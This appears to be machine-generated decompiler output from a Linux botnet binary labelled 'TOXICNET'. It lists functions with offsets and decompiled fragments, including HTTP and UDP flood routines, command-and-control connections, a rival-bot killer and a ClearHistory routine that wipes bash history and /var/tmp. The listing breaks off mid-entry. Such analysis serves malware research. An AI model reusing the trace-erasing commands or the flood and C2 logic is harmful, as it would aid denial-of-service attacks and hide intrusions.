                        while (true) {
                            while (true) {
                                int32_t v122 = prints(v96, v119, v110, v104, (int32_t)&v121); // 0x8a9c
                                    int32_t v124 = printi(v96, v123, 10, 1, v110, v104, 97) + result; // 0x8b0c
                                        int32_t v126 = printi(v96, v125, 16, 0, v110, v104, 97) + result; // 0x8b70
                                            int32_t v128 = printi(v96, v127, 16, 0, v110, v104, 65) + result; // 0x8bd4
                                                int32_t v131 = printi(v96, v130, 10, 0, v110, v104, 97) + result; // 0x8c38
                                                    int32_t v134 = prints(v96, (char *)&v98, v110, v104, v132); // 0x8c8c
            printchar(a1, (int32_t)*v99);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 62358
++++++++ FUNCTION END 62807
++++++++ FUNCTION LENGTH 449
        result = inet_ntop4(a2, a3, a4);
        while (true) {
                while (true) {
                            while (true) {
                                                        if (inet_ntop4(a2 + 12, v134, v99 - v134 - 32) == 0) {
                                                v132 = sprintf(v134, v113, v130, v131, (int32_t)&v133, (int32_t)&v133, (int32_t)&v133);
                                            if (inet_ntop4(a2 + 12, v134, v99 - v134 - 32) == 0) {
                                v132 = sprintf(v128, v113, v130, v131, (int32_t)&v133, (int32_t)&v133, (int32_t)&v133);
                while (true) {
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5667
++++++++ FUNCTION END 5832
++++++++ FUNCTION LENGTH 165
    int32_t v96 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x9674
    while (true) {
        if (fdgets(v98, 0x1000, v96, v98) == 0) {
            __GI_close(v96);
        uppercase((char *)&v97);
        if (strstr(v98, "BOGOMIPS") == v98) {
            while (true) {
                            while (true) {
                                        __GI_close(v96);
=================FUNCTION : __GI_config_read ===================
++++++++ FUNCTION START 48134
++++++++ FUNCTION END 48596
++++++++ FUNCTION LENGTH 462
        while (true) {
            while (true) {
                int32_t v118 = fgets(v115 + v108, v117 - v108, v116); // 0x19160
                        while (true) {
                                    v125 = getc_unlocked((int16_t *)v126);
                                                while (true) {
                                                                    while (true) {
                            v125 = __GI_fgetc(v126);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 3551
++++++++ FUNCTION END 3761
++++++++ FUNCTION LENGTH 210
        result2 = prints(a1, (char *)&v96, a5, a6, 0);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v100, a5 - 1, a6, (int32_t)&v103);
            result = prints(a1, v101, a5, a6, (int32_t)&v103);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v100, a5 - 1, a6, (int32_t)&v103);
        result2 = prints(a1, v101, a5, a6, (int32_t)&v103);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 61797
++++++++ FUNCTION END 62204
++++++++ FUNCTION LENGTH 407
        return inet_pton4(v95, a3);
                    while (true) {
        while (true) {
                        if (inet_pton4(v102, v100) > 0) {
                                    while (true) {
                                    while (true) {
                                    while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 11872
++++++++ FUNCTION END 12026
++++++++ FUNCTION LENGTH 154
    rand();
    int32_t v97 = rand(); // 0x1045c
    int32_t result = sprintf(v99, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v100, v101, -6 * v97);
    while (true) {
        if (__libc_fork() != 0) {
            while (true) {
                    if (socket_connect(a1, a3) != 0) {
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 7566
++++++++ FUNCTION END 7738
++++++++ FUNCTION LENGTH 172
        __libc_send(a1, v99, 1, 0x4000);
                __libc_send(a1, v99, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v99, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v99, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 10852
++++++++ FUNCTION END 10988
++++++++ FUNCTION LENGTH 136
    int32_t v96 = socket(2, 2, 0); // 0xf360
    __GI_gethostbyname(a1);
    while (true) {
        rand();
            __libc_send(v96, v108, 65, 0);
            __libc_connect(v96, v99, 16);
                __GI_close(v96);
=================FUNCTION : nprocessors_onln ===================
++++++++ FUNCTION START 42096
++++++++ FUNCTION END 42264
++++++++ FUNCTION LENGTH 168
    int32_t v99 = __GI_config_open((int32_t)&v95 - 0x8a18); // 0x17b30
        int32_t v102 = __GI_config_open(v96 - 0x8a08); // 0x17bbc
            while (true) {
        __GI_config_close((int32_t *)v100);
    while (true) {
        __GI_config_close((int32_t *)v100);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 6072
++++++++ FUNCTION END 6289
++++++++ FUNCTION LENGTH 217
            while (true) {
                sockprintf(v103, (int32_t)"PING");
                while (true) {
                    if (__libc_recv(v103, (int32_t)&v104, 1, 0, v107) != 1) {
        while (true) {
            if (__libc_recv(v103, (int32_t)&v104, 1, 0, v107) == 1) {
=================FUNCTION : sendHTTP2 ===================
++++++++ FUNCTION START 12029
++++++++ FUNCTION END 12182
++++++++ FUNCTION LENGTH 153
    while (true) {
        int32_t v100 = rand() % 36; // 0x10638
        sprintf(v98, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v101, v100);
        if (__libc_fork() != 0) {
            while (true) {
                    if (socket_connect(a2, a3) != 0) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 57285
++++++++ FUNCTION END 57532
++++++++ FUNCTION LENGTH 247
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
    while (true) {
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 56554
++++++++ FUNCTION END 56828
++++++++ FUNCTION LENGTH 274
        while (true) {
                while (true) {
                while (true) {
            while (true) {
        while (true) {
        while (true) {
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 37837
++++++++ FUNCTION END 38226
++++++++ FUNCTION LENGTH 389
        free();
                    free();
                            free();
                    free();
                free();
                free();
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4869
++++++++ FUNCTION END 5024
++++++++ FUNCTION LENGTH 155
    __GI_close(a1);
    __GI_sigprocmask(0, v98, v100, v98);
    while (true) {
        v102 = __libc_waitpid(v103, (int32_t)&v101, 0);
        __GI_sigprocmask(2, v100, 0, v100);
    __GI_sigprocmask(2, v100, 0, v100);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5835
++++++++ FUNCTION END 5957
++++++++ FUNCTION LENGTH 122
    int32_t v98 = __GI_open((int32_t)"/proc/cpuinfo", 0); // 0x98a4
    while (true) {
        if (fdgets(v97, 0x1000, v98, v97) == 0) {
            __GI_close(v98);
        uppercase((char *)&v96);
        if (strstr(v97, "BOGOMIPS") == v97) {
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 28350
++++++++ FUNCTION END 28580
++++++++ FUNCTION LENGTH 230
            while (true) {
        _stdio_openlist_dec_use();
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 24758
++++++++ FUNCTION END 25650
++++++++ FUNCTION LENGTH 892
    while (true) {
        while (true) {
                while (true) {
                                                while (true) {
                                                            while (true) {
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 19370
++++++++ FUNCTION END 19662
++++++++ FUNCTION LENGTH 292
            int32_t v99 = __GI_getpagesize(); // 0x12cf8
                    free();
            free();
            free();
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 40709
++++++++ FUNCTION END 40886
++++++++ FUNCTION LENGTH 177
                while (true) {
                        while (true) {
                            __GI_random_r((int32_t *)v96, (int32_t)&v107);
            while (true) {
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 18267
++++++++ FUNCTION END 18718
++++++++ FUNCTION LENGTH 451
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 12185
++++++++ FUNCTION END 12298
++++++++ FUNCTION LENGTH 113
    inet_addr(a1);
        int32_t v98 = socket(2, 1, 0); // 0x107ec
        __libc_connect(v98, (int32_t)&v97, 16);
        __GI_close(v98);
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 10030
++++++++ FUNCTION END 10163
++++++++ FUNCTION LENGTH 133
    int32_t v97 = __GI_gethostbyname(a1); // 0xdecc
    int32_t v103 = socket(2, 1, 6); // 0xdf44
    __GI_setsockopt(v103, 6, 1, (int32_t)&v96, 4);
    if (__libc_connect(v103, (int32_t)&v102, 16) == -1) {
=================FUNCTION : __aeabi_idiv ===================
++++++++ FUNCTION START 66859
++++++++ FUNCTION END 67369
++++++++ FUNCTION LENGTH 510
        while (true) {
                                    while (true) {
                                        while (true) {
                    while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 7911
++++++++ FUNCTION END 8102
++++++++ FUNCTION LENGTH 191
    while (true) {
        int32_t v102 = __libc_recv(a1, v101, 1, 0, v101); // 0xa9dc
                    if (strstr(a6, (char *)a2) == 0) {
                int32_t v103 = __libc_recv(a1, v101 + 1, 2, 0, v99); // 0xaa44
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 29933
++++++++ FUNCTION END 30184
++++++++ FUNCTION LENGTH 251
    while (true) {
    while (true) {
        while (true) {
                            while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 30693
++++++++ FUNCTION END 30894
++++++++ FUNCTION LENGTH 201
            while (true) {
                        while (true) {
    while (true) {
            while (true) {
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 49061
++++++++ FUNCTION END 49335
++++++++ FUNCTION LENGTH 274
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 11648
++++++++ FUNCTION END 11766
++++++++ FUNCTION LENGTH 118
    while (true) {
            __libc_system(v96);
            __libc_system(v96);
=================FUNCTION : __GI_strchrnul ===================
++++++++ FUNCTION START 57904
++++++++ FUNCTION END 58096
++++++++ FUNCTION LENGTH 192
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : ClearHistory ===================
++++++++ FUNCTION START 11769
++++++++ FUNCTION END 11869
++++++++ FUNCTION LENGTH 100
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"cd /root;rm -rf .bash_history");
    return __libc_system((int32_t)"cd /var/tmp; rm -f *");
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 30897
++++++++ FUNCTION END 31117
++++++++ FUNCTION LENGTH 220
        while (true) {
        while (true) {
        while (true) {
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 17076
++++++++ FUNCTION END 17207
++++++++ FUNCTION LENGTH 131
        __GI_close(v97);
    int32_t v104 = socket(2, 1, 0); // 0x11a94
    return connectTimeout(v104, v95, v102, 30) == 0;
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 25921
++++++++ FUNCTION END 26187
++++++++ FUNCTION LENGTH 266
            while (true) {
                                    case 256: {
                                    case 512: {
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 7434
++++++++ FUNCTION END 7563
++++++++ FUNCTION LENGTH 129
    int32_t result = __libc_fork(); // 0xa40c
    while (true) {
                free();
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 7272
++++++++ FUNCTION END 7431
++++++++ FUNCTION LENGTH 159
    if (getHost(a2, &v97) != 0) {
    if (__libc_connect(a1, (int32_t)&v96, 16) >= 0) {
    getsockopt(a1, 1, 4, (int32_t)&v105, (int32_t)&v104);
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 24060
++++++++ FUNCTION END 24235
++++++++ FUNCTION LENGTH 175
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 2751
++++++++ FUNCTION END 2909
++++++++ FUNCTION LENGTH 158
        while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 41001
++++++++ FUNCTION END 41180
++++++++ FUNCTION LENGTH 179
        srandom_r((int32_t *)v96, a3);
        srandom_r((int32_t *)v96, a3);
    srandom_r((int32_t *)v96, a3);
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 41385
++++++++ FUNCTION END 41833
++++++++ FUNCTION LENGTH 448
    while (true) {
                        while (true) {
                while (true) {
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 30187
++++++++ FUNCTION END 30449
++++++++ FUNCTION LENGTH 262
                while (true) {
            while (true) {
                while (true) {
=================FUNCTION : sockprintf ===================
++++++++ FUNCTION START 4353
++++++++ FUNCTION END 4459
++++++++ FUNCTION LENGTH 106
    print(&v97, a2, (int32_t)&v98);
    int32_t result = __libc_send(a1, v96, strlen(str), 0x4000); // 0x8e44
    free();
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 31697
++++++++ FUNCTION END 31843
++++++++ FUNCTION LENGTH 146
    while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 7145
++++++++ FUNCTION END 7269
++++++++ FUNCTION LENGTH 124
    while (true) {
            if (strcasestr((char *)a1, v99, 4 * v98) != 0) {
=================FUNCTION : __GI_closedir ===================
++++++++ FUNCTION START 47130
++++++++ FUNCTION END 47258
++++++++ FUNCTION LENGTH 128
        free();
        free();
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 7741
++++++++ FUNCTION END 7908
++++++++ FUNCTION LENGTH 167
    while (true) {
                while (true) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 57535
++++++++ FUNCTION END 57673
++++++++ FUNCTION LENGTH 138
    while (true) {
        while (true) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 38464
++++++++ FUNCTION END 38691
++++++++ FUNCTION LENGTH 227
        while (true) {
                while (true) {
=================FUNCTION : __GI_config_close ===================
++++++++ FUNCTION START 48599
++++++++ FUNCTION END 48712
++++++++ FUNCTION LENGTH 113
    __GI_fclose((int16_t *)*a1);
    return free();
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 28690
++++++++ FUNCTION END 28886
++++++++ FUNCTION LENGTH 196
            while (true) {
                uint32_t v103 = getc_unlocked((int16_t *)a3); // 0x14ff8
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 49338
++++++++ FUNCTION END 49516
++++++++ FUNCTION LENGTH 178
    while (true) {
            while (true) {
=================FUNCTION : __close_nameservers ===================
++++++++ FUNCTION START 64523
++++++++ FUNCTION END 64636
++++++++ FUNCTION LENGTH 113
        free();
    return free();
=================FUNCTION : readdir64 ===================
++++++++ FUNCTION START 47779
++++++++ FUNCTION END 47923
++++++++ FUNCTION LENGTH 144
    while (true) {
            if (__getdents64(v107, (int32_t *)v108, v109, v100) < 1) {
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 57089
++++++++ FUNCTION END 57282
++++++++ FUNCTION LENGTH 193
        while (true) {
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 39224
++++++++ FUNCTION END 39376
++++++++ FUNCTION LENGTH 152
    __GI_sigprocmask(1, (int32_t)&v97, 0, 32);
    while (true) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 58099
++++++++ FUNCTION END 58224
++++++++ FUNCTION LENGTH 125
    while (true) {
        while (true) {
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 44890
++++++++ FUNCTION END 45032
++++++++ FUNCTION LENGTH 142
    int32_t v98 = __vfork(); // 0x187d8
        v100 = wait4(v98, (int32_t)&v100);
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 50282
++++++++ FUNCTION END 50503
++++++++ FUNCTION LENGTH 221
            while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 58227
++++++++ FUNCTION END 58425
++++++++ FUNCTION LENGTH 198
        while (true) {
            while (true) {
=================FUNCTION : __aeabi_ddiv ===================
++++++++ FUNCTION START 70613
++++++++ FUNCTION END 71240
++++++++ FUNCTION LENGTH 627
            while (true) {
                while (true) {
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 22159
++++++++ FUNCTION END 22321
++++++++ FUNCTION LENGTH 162
    if (__GI_close(v102) < 0) {
    _stdio_openlist_dec_use();
=================FUNCTION : __GI_fgetc ===================
++++++++ FUNCTION START 54328
++++++++ FUNCTION END 54470
++++++++ FUNCTION LENGTH 142
            result = getc_unlocked((int16_t *)a1);
        result = getc_unlocked((int16_t *)a1);
=================FUNCTION : __GI_memset ===================
++++++++ FUNCTION START 29275
++++++++ FUNCTION END 29499
++++++++ FUNCTION LENGTH 224
        while (true) {
        while (true) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 66189
++++++++ FUNCTION END 66287
++++++++ FUNCTION LENGTH 98
    return __GI_config_open((int32_t)&v95 - 0x85c4);
=================FUNCTION : __GI_time ===================
++++++++ FUNCTION START 19876
++++++++ FUNCTION END 19983
++++++++ FUNCTION LENGTH 107
    gettimeofday((int32_t)&v96, 0);
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 32705
++++++++ FUNCTION END 32806
++++++++ FUNCTION LENGTH 101
    int32_t v98 = inet_aton((char *)v96, (int32_t)&v97); // 0x15a3c
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 4152
++++++++ FUNCTION END 4250
++++++++ FUNCTION LENGTH 98
    return print(NULL, a1, (int32_t)&v96);
=================FUNCTION : random ===================
++++++++ FUNCTION START 39587
++++++++ FUNCTION END 39694
++++++++ FUNCTION LENGTH 107
    __GI_random_r((int32_t *)(v96 + 1208), (int32_t)&result);
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 43141
++++++++ FUNCTION END 43248
++++++++ FUNCTION LENGTH 107
        int32_t v96 = __GI_open((int32_t)&v95 - 0x89d0, a2); // 0x18424
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 9457
++++++++ FUNCTION END 9556
++++++++ FUNCTION LENGTH 99
    return rand_cmwc() & -1 - a1 ^ v96 & a1;
=================FUNCTION : srand ===================
++++++++ FUNCTION START 40240
++++++++ FUNCTION END 40346
++++++++ FUNCTION LENGTH 106
    srandom_r((int32_t *)a1, (int32_t)&v97 + 1208);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 9922
++++++++ FUNCTION END 10027
++++++++ FUNCTION LENGTH 105
        __GI_close(a1);
=================FUNCTION : strcspn ===================
++++++++ FUNCTION START 56958
++++++++ FUNCTION END 57086
++++++++ FUNCTION LENGTH 128
    while (true) {
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 32809
++++++++ FUNCTION END 32907
++++++++ FUNCTION LENGTH 98
    return __GI_gethostbyname2();
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 32473
++++++++ FUNCTION END 32595
++++++++ FUNCTION LENGTH 122
    while (true) {
=================FUNCTION : __GI___uClibc_fini ===================
++++++++ FUNCTION START 43012
++++++++ FUNCTION END 43138
++++++++ FUNCTION LENGTH 126
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 20209
++++++++ FUNCTION END 20309
++++++++ FUNCTION LENGTH 100
    return wait4(v96, v97);
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 22633
++++++++ FUNCTION END 22767
++++++++ FUNCTION LENGTH 134
    int32_t result = _vfprintf_internal(v97, (char *)v107, v108, v105, v100, v105, v100, v100, v100, v105, v98); // 0x13510
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 25653
++++++++ FUNCTION END 25811
++++++++ FUNCTION LENGTH 158
        while (true) {
=================FUNCTION : __GI_raise ===================
++++++++ FUNCTION START 34009
++++++++ FUNCTION END 34107
++++++++ FUNCTION LENGTH 98
    return kill(__GI_getpid(), a1);
=================FUNCTION : __GI__exit ===================
++++++++ FUNCTION START 21519
++++++++ FUNCTION END 21628
++++++++ FUNCTION LENGTH 109
    while (true) {
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 5027
++++++++ FUNCTION END 5150
++++++++ FUNCTION LENGTH 123
    while (true) {
=================FUNCTION : getBuild ===================
++++++++ FUNCTION START 17453
++++++++ FUNCTION END 17551
++++++++ FUNCTION LENGTH 98
    return (int32_t)"TOXICNET";
=================FUNCTION : __getdents64 ===================
++++++++ FUNCTION START 60143
++++++++ FUNCTION END 60304
++++++++ FUNCTION LENGTH 161
    while (true) {
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 6627
++++++++ FUNCTION END 6732
++++++++ FUNCTION LENGTH 105
        __GI_close(*a1);
=================FUNCTION : fd_to_DIR ===================
++++++++ FUNCTION START 47368
++++++++ FUNCTION END 47495
++++++++ FUNCTION LENGTH 127
        free();
=================FUNCTION : __GI_config_open ===================
++++++++ FUNCTION START 48715
++++++++ FUNCTION END 48827
++++++++ FUNCTION LENGTH 112
    if (__GI_fopen(v96, (int32_t)&v95 - 0x89f0) == 0) {
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 62207
++++++++ FUNCTION END 62355
++++++++ FUNCTION LENGTH 148
    while (true) {
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 22431
++++++++ FUNCTION END 22529
++++++++ FUNCTION LENGTH 98
    return _stdio_fopen();
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 20644
++++++++ FUNCTION END 20743
++++++++ FUNCTION LENGTH 99
    return getrlimit(7, (int32_t)&v96) < 0 ? 256 : v96;
=================FUNCTION : skip_and_NUL_space ===================
++++++++ FUNCTION START 63986
++++++++ FUNCTION END 64124
++++++++ FUNCTION LENGTH 138
    while (true) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 31323
++++++++ FUNCTION END 31459
++++++++ FUNCTION LENGTH 136
    while (true) {
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 6292
++++++++ FUNCTION END 6391
++++++++ FUNCTION LENGTH 99
    return __GI_inet_ntoa(v96);
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 5445
++++++++ FUNCTION END 5544
++++++++ FUNCTION LENGTH 99
    int32_t v96 = inet_addr(a1); // 0x95a0
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 31462
++++++++ FUNCTION END 31694
++++++++ FUNCTION LENGTH 232
        while (true) {
=================FUNCTION : rand ===================
++++++++ FUNCTION START 39486
++++++++ FUNCTION END 39584
++++++++ FUNCTION LENGTH 98
    return random();
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 9820
++++++++ FUNCTION END 9919
++++++++ FUNCTION LENGTH 99
    return rand_cmwc();
=================FUNCTION : __GI_gethostbyname2 ===================
++++++++ FUNCTION START 32910
++++++++ FUNCTION END 33013
++++++++ FUNCTION LENGTH 103
    gethostbyname2_r(v98, v99, (int32_t *)((int32_t)&v97 + 0x6720), (int32_t)&v97 + 0x6568, 440, v96, v95);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 32598
++++++++ FUNCTION END 32702
++++++++ FUNCTION LENGTH 104
    int32_t result = __GI_inet_ntoa_r(); // 0x15a24
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 61625
++++++++ FUNCTION END 61794
++++++++ FUNCTION LENGTH 169
    while (true) {
=================FUNCTION : _promoted_size ===================
++++++++ FUNCTION START 26190
++++++++ FUNCTION END 26312
++++++++ FUNCTION LENGTH 122
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 27590
++++++++ FUNCTION END 27716
++++++++ FUNCTION LENGTH 126
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // r4
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 24459
++++++++ FUNCTION END 24582
++++++++ FUNCTION LENGTH 123
    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 62810
++++++++ FUNCTION END 63022
++++++++ FUNCTION LENGTH 212
                while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 29603
++++++++ FUNCTION END 29725
++++++++ FUNCTION LENGTH 122
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 66643
++++++++ FUNCTION END 66856
++++++++ FUNCTION LENGTH 213
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5153
++++++++ FUNCTION END 5277
++++++++ FUNCTION LENGTH 124
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 5960
++++++++ FUNCTION END 6069
++++++++ FUNCTION LENGTH 109
            v96 = rand_cmwc();
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 31846
++++++++ FUNCTION END 31953
++++++++ FUNCTION LENGTH 107
    uint32_t v96 = __GI_tcgetattr(); // 0x15894
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 9713
++++++++ FUNCTION END 9817
++++++++ FUNCTION LENGTH 104
    free();
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 4253
++++++++ FUNCTION END 4350
++++++++ FUNCTION LENGTH 97
    return print(&a1, a2, (int32_t)&a3);
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 64639
++++++++ FUNCTION END 64737
++++++++ FUNCTION LENGTH 98
    return __read_etc_hosts_r();
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 22532
++++++++ FUNCTION END 22630
++++++++ FUNCTION LENGTH 98
    return __GI_vsnprintf();
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 28064
++++++++ FUNCTION END 28240
++++++++ FUNCTION LENGTH 176
            while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 6504
++++++++ FUNCTION END 6624
++++++++ FUNCTION LENGTH 120
        result = __libc_recv(a1, a3, a4, 0, (int32_t)&v101);
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2864 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2896 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 3141 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3153 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v99);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 3284 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3296 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v99);
=============================WHILE LOOPS ID : 5 @ prints ====================================
++++++++ WHILE START : 3434 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 3446 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v99);
=============================WHILE LOOPS ID : 7 @ print ====================================
++++++++ WHILE START : 3875 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 4141 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v99);
		while (true) {
		while (true) {
		int32_t v122 = prints(v96, v119, v110, v104, (int32_t)&v121); // 0x8a9c
		int32_t v124 = printi(v96, v123, 10, 1, v110, v104, 97) + result; // 0x8b0c
		int32_t v126 = printi(v96, v125, 16, 0, v110, v104, 97) + result; // 0x8b70
		int32_t v128 = printi(v96, v127, 16, 0, v110, v104, 65) + result; // 0x8bd4
		int32_t v131 = printi(v96, v130, 10, 0, v110, v104, 97) + result; // 0x8c38
		int32_t v134 = prints(v96, (char *)&v98, v110, v104, v132); // 0x8c8c
		printchar(a1, (int32_t)*v99);
=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
++++++++ WHILE START : 4986 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 5012 
++++++++ INTRESTING INSTRUCTIONS :  
		v102 = __libc_waitpid(v103, (int32_t)&v101, 0);
		__GI_sigprocmask(2, v100, 0, v100);
=============================WHILE LOOPS ID : 11 @ getBogos ====================================
++++++++ WHILE START : 5767 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5831 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v98, 0x1000, v96, v98) == 0) {
		__GI_close(v96);
		uppercase((char *)&v97);
		if (strstr(v98, "BOGOMIPS") == v98) {
		while (true) {
		while (true) {
		__GI_close(v96);
=============================WHILE LOOPS ID : 12 @ getCores ====================================
++++++++ WHILE START : 5937 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 5956 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v97, 0x1000, v98, v97) == 0) {
		__GI_close(v98);
		uppercase((char *)&v96);
		if (strstr(v97, "BOGOMIPS") == v97) {
=============================WHILE LOOPS ID : 13 @ recvLine ====================================
++++++++ WHILE START : 6191 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6264 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v103, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v103, (int32_t)&v104, 1, 0, v107) != 1) {
=============================WHILE LOOPS ID : 14 @ recvLine ====================================
++++++++ WHILE START : 6271 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6282 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_recv(v103, (int32_t)&v104, 1, 0, v107) == 1) {
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 7251 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 7266 
++++++++ INTRESTING INSTRUCTIONS :  
